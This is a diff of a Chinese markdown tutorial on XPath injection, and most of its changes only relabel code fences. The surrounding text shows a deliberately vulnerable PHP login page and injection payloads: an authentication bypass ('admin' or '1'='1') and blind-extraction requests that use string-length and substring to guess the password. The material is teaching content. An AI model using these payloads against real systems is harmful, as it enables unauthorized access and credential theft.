@@ -19,7 +19,7 @@ xpath_user.xml 文件
 
 漏洞测试文件
 
-```
+```php+HTML
 <!DOCTYPE html>
 <html>
 	<head>
@@ -34,9 +34,7 @@ xpath_user.xml 文件
 			</form>
 	</body>
 </html>
-```
 
-```php+HTML
 <?php
 if(file_exists('xpath_user.xml')){
 	$xml=simplexml_load_file('xpath_user.xml');
@@ -64,7 +62,7 @@ select * from users where username=’username’ and password=’password’
 
 万能密码登录 
 
-```
+```bash
 admin' or '1'='1
 username=admin' or '1'='1 &password=xxxxxxxxxxx&submit=submit
 ```
@@ -77,13 +75,13 @@ string-length()获取字符长度
 
 substring 截取字符
 
-```
+```bash
 username=admin'and string-length(@password)=5 or '1'='1&password=0&submit=submit
 ```
 
 返回正确是就等于登录成功
 
-```
+```bash
 username=admin'and substring(@password,1,1)='a' or '1'='1&password=0&submit=submit
 ```
 
